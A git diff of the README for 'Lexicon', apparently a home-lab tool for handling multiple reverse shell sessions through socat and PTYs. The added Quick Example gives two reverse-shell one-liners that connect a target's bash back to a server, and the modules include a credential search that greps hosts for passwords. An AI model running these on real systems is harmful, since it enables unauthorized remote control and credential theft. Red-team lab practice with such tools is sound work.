@@ -1,30 +1,12 @@
 # Lexicon
 
-Lexicon is a lightweight, multi-session reverse shell handler built around `socat` and Linux PTYs. It provides a structured way to manage multiple reverse shell connections, interact with them through a centralized controller, and execute modular scripts on remote hosts.
+Lexicon is a lightweight CLI tool for managing multiple reverse shell sessions in local cybersecurity lab environments.
 
-Unlike traditional single-session listeners (e.g., netcat), Lexicon is designed to handle multiple concurrent connections cleanly, with session tracking, command execution, and extensibility in mind.
+It provides centralized session control, command execution, and modular scripting across multiple hosts.
+
+Unlike traditional single-session listeners (e.g., netcat), Lexicon is designed for multi-session management, making it ideal for homelabs, red team practice, and controlled testing environments.
 
 ⚠️ Disclaimer: This tool is intended for home lab and educational use only. It is designed to operate within controlled local network environments and is not intended for deployment over the public internet.
-
----
-
-## Overview
-
-Lexicon consists of four main components:
-
-* **Systemd Service (****`lexicon.service`****)**
-  Runs a persistent `socat` listener on the host.
-
-* **Listener (****`socat.sh`****)**
-  Accepts incoming connections and spawns a handler per connection.
-
-* **Handler (****`handler.sh`****)**
-  Creates a new PTY for each connection and links it to a session file.
-
-* **Controller (****`lexicon`****)**
-  Interactive CLI used to manage sessions and send commands.
-
-Additionally, Lexicon supports a **modular script system**, allowing you to execute prebuilt or custom scripts on remote hosts.
 
 ---
 
@@ -38,6 +20,67 @@ Additionally, Lexicon supports a **modular script system**, allowing you to exec
 * Built-in safeguards for long-running commands
 * Systemd integration for persistence
 * Simple install/uninstall workflow
+
+---
+
+## Quick Example
+
+Connect from a Target using one of the following:
+```bash
+socat TCP:<SERVER_IP>:8080 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+bash -i >& /dev/tcp/<SERVER_IP>/8080 0>&1
+```
+Start Lexicon:
+```bash
+$ lexicon
+
+Controller starting. PTY dir: /opt/lexicon/sessions
+Available Sessions (most recent first):
+   1) /opt/lexicon/sessions/session-0320T140007-56821 -> /dev/pts/3 (tadmin:tty)
+Select session number (or 'r' to refresh, 'q' to quit): 1
+
+Selected:
+ /opt/lexicon/sessions/session-0320T140007-56821
+ (resolves to /dev/pts/3)
+
+Now interacting with session:
+/opt/lexicon/sessions/session-0320T140007-56821
+Commands:
+ /send <text>
+ /list (show sessions)
+ /switch (choose another)
+ /script [name]
+ /quit 
+
+/send whoami
+--- begin remote output ---
+REMOTE> whoami
+REMOTE> admin
+ --- end remote output ---
+
+
+```
+
+---
+
+## Overview
+
+Lexicon consists of four main components:
+
+* **Systemd Service (`lexicon.service`)**
+  Runs a persistent `socat` listener on the host.
+
+* **Listener (`socat.sh`)**
+  Accepts incoming connections and spawns a handler per connection.
+
+* **Handler (`handler.sh`)**
+  Creates a new PTY for each connection and links it to a session file.
+
+* **Controller (`lexicon`)**
+  Interactive CLI used to manage sessions and send commands.
+
+Additionally, Lexicon supports a **modular script system**, allowing you to execute prebuilt or custom scripts on remote hosts.
 
 ---
 
@@ -143,12 +186,6 @@ Terminate the current session.
 
 ---
 
-### `/read`
-
-Attempt to read any pending output from the session.
-
----
-
 ### `/quit`
 
 Exit the controller.
@@ -184,7 +221,7 @@ Gathers system information including:
 * Running processes
 * Privilege checks
 
-#### 'credSearch'
+#### `credSearch.sh`
 
 Searches for interesting files and greps for passwords
 
